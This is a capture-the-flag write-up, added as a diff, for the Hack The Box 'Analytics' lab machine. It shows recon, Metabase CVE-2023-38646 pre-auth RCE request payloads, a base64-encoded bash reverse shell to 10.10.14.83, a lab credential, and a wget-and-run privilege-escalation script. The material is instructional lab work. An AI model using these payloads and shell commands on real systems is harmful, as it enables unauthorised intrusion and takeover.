@@ -1,0 +1,116 @@
+# Recon
+
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-10 15:26 CEST
+Nmap scan report for 10.129.140.45
+Host is up (0.032s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)
+|_  256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://analytical.htb/
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.01 seconds
+
+
+Http service on nginx with hostname analytical.htb (add 10.129.140.45	analytical.htb to /etc/hosts).
+By visting the website there is some information about the company and a login page. The login page redirects to data.analytical.htb.
+This gives a login of metabase, a cve search for metabase gives: CVE-2023-38646.
+
+This CVE works on metabase 0.46.6 and this is the version our site is in. 
+We find a git to check and exploit the cve https://github.com/securezeron/CVE-2023-38646
+
+The CVE can be exploited following this writeup: https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/
+
+python3 CVE-2023-38646-POC.py --ip data.analytical.htb                                                                    [ 3:38PM ] 
+Failed to connect using HTTPS for data.analytical.htb. Trying next protocol...
+None. Vulnerable Metabase Instance:-
+             IP: data.analytical.htb
+             Setup Token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f
+
+this leaks the setup token. We can use the payload below to check if the code execution works by changing the address to a local adress, in this case 10.10.14.83, and check if the execution works by opening a webserver (python3 -m http.server 8081)
+
+POST /api/setup/validate HTTP/1.1
+Host: localhost
+Content-Type: application/json
+Content-Length: 566
+
+{
+    "token": "5491c003-41c2-482d-bab4-6e174aa1738c",
+    "details":
+    {
+        "is_on_demand": false,
+        "is_full_sync": false,
+        "is_sample": false,
+        "cache_ttl": null,
+        "refingerprint": false,
+        "auto_run_queries": true,
+        "schedules":
+        {},
+        "details":
+        {
+            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER IAMPWNED BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\nnew java.net.URL('https://10.10.14.83:8081').openConnection().getContentLength()\n$$--=x\\;",
+            "advanced-options": false,
+            "ssl": true
+        },
+        "name": "an-sec-research-team",
+        "engine": "h2"
+    }
+}
+
+
+This gives us a hit and lets us know that we can get RCE. Now we use the second payload listed to get a reverse shell. First we need to change the base64 paylaod to hit our port. The payload c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuODMvOTAwMSAwPiYx ==> sh -i >& /dev/tcp/10.10.14.83/9001 0>&1 works.
+
+POST /api/setup/validate HTTP/1.1
+Host: data.analytical.htb
+Content-Type: application/json
+Content-Length: 818
+
+{
+    "token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f",
+    "details":
+    {
+        "is_on_demand": false,
+        "is_full_sync": false,
+        "is_sample": false,
+        "cache_ttl": null,
+        "refingerprint": false,
+        "auto_run_queries": true,
+        "schedules":
+        {},
+        "details":
+        {
+            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuODMvOTAwMSAwPiYx}|{base64,-d}|{bash,-i}')\n$$--=x",
+            "advanced-options": false,
+            "ssl": true
+        },
+        "name": "an-sec-research-team",
+        "engine": "h2"
+    }
+}
+
+This gives us a shell to a docker container. In the env variables we find the credentials for metalytics:An4lytics_ds2022#
+
+
+Running linpeas gives active ports on the local host.
+
+tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -   
+
+Port 3000 and 53
+
+In the ngix config we see that the port 3000 is the data.analytical.htb
+
+We see that the box is running ubuntu jammy jellyfish 22.04 this version is vulnerable for ubuntu jammy jellyfish 22.04. We find a script for it in this github project https://github.com/OllaPapito/gameoverlay/tree/babydoge. Here we get the script overlay.sh onto the box when running the script we get root privelages.
+
+wget http://10.10.14.83/overlay.sh
+chmod +x overlay.sh
+./overlay.sh
+root@analytics:~# cat ~/root.txt
+
+
